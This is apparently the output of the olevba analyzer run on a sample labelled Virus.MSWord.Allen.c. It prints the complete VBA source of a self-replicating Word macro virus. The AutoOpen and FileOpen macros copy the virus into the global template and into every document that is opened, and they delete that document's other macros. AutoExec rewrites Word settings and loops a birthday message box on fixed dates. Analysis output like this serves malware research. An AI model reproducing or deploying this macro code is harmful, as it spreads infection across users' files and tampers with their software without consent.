olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.c-e2f31e6cc9471cbc290ab0ed4ce140650d41529d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.c-e2f31e6cc9471cbc290ab0ed4ce140650d41529d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Allen.c-e2f31e6cc9471cbc290ab0ed4ce140650d41529d - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Attribute MAIN.VB_Description = "Salam Kasih dari Edelweis-eth seorang bidak dan pencari  yang tak tahu kapan akan temu dan sampai kapan harus menunggu"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoExec.MAIN"
Dim Tgl
Dim Bln
Dim Thn
Dim Jam
Dim Lebar
Dim Tinggi
Dim BarOK
Dim LebOK
Dim Pelaku$
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Tgl = WordBasic.Day(WordBasic.Now())
Bln = WordBasic.Month(WordBasic.Now())
Thn = WordBasic.Year(WordBasic.Now())
Jam = WordBasic.Hour(WordBasic.Now())
Dim Pesan1$, Pelaku1$, Pelaku2$, Pelaku3$, Pelaku4$, Pelaku5$, Pelaku6$
Pelaku1$ = "Edelweis-eth"
Pelaku2$ = "Ch. Sienna"
Pelaku3$ = "My Sist"
Pelaku4$ = "Rolly"
Pelaku5$ = "Indonesia"
Pelaku6$ = "Hastoe"
If Thn < 1998 Then GoTo HUT
If Jam < 0 Then GoTo Akhir
HUT:
If Tgl = 17 And Bln = 3 Then
    Pelaku$ = Pelaku1$
    GoTo Ultah
ElseIf Tgl = 24 And Bln = 4 Then
    Pelaku$ = Pelaku2$
    GoTo Ultah
ElseIf Tgl = 1 And Bln = 6 Then
    Pelaku$ = Pelaku3$
    GoTo Ultah
ElseIf Tgl = 24 And Bln = 10 Then
    Pelaku$ = Pelaku4$
    GoTo Ultah
ElseIf Tgl = 17 And Bln = 8 Then
    Pelaku$ = Pelaku5$
    GoTo Ultah
ElseIf Tgl = 7 And Bln = 12 Then
    Pelaku$ = Pelaku6$
    GoTo Ultah
End If
GoTo Lanjut
Ultah:
    Pesan1$ = "Hari ini " + Pelaku$ + " berulang tahun, maka matikan saja komputer anda, tinggalkan semua pekerjaan dan luangkan waktu untuk mengucapkan selamat ulang tahun pada " + Pelaku$ + "."
    WordBasic.Beep
    WordBasic.MsgBox Pesan1$, "#Err 6857-Selamat Ulang Tahun, " + Pelaku$ + "....#", 48
    GoTo Ultah
Lanjut:
WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="5", Password:="", WritePassword:="", RecommendReadOnly:=0
WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1
WordBasic.ToolsOptionsUserInfo Name:="Edelweis-eth", Initials:="AIES", Address:="Kau yang selalu kucari dimana kau??" + Chr(13) + "dalam gelap tak tertebak, dalam terang tak terlacak" + Chr(13) + "Tak juga dalam mimpi-mimpi malamku" + Chr(13) + "bahkan dalam kidung-kidung doaku yang selalu kukirimkan dengan hati hampa" + Chr(13) + "DIMANA KAU??" + Chr(13)
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen.c-e2f31e6cc9471cbc290ab0ed4ce140650d41529d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Attribute MAIN.VB_Description = "Salam Kasih dari Edelweis-eth seorang bidak dan pencari  yang tak tahu kapan akan temu dan sampai kapan harus menunggu"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Allen.c-e2f31e6cc9471cbc290ab0ed4ce140650d41529d - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Attribute MAIN.VB_Description = "Salam Kasih dari Edelweis-eth seorang bidak dan pencari  yang tak tahu kapan akan temu dan sampai kapan harus menunggu"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Akhir
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo Akhir
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
Akhir:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

